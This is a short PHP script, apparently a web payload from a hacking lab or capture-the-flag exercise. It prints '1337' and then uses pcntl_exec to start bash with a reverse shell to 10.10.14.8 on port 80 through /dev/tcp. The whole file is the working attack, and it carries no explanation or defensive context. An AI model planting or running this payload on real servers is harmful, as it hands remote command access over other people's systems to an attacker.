<?php
    echo "1337";
    pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/10.10.14.8/80 0>&1"]);
?>
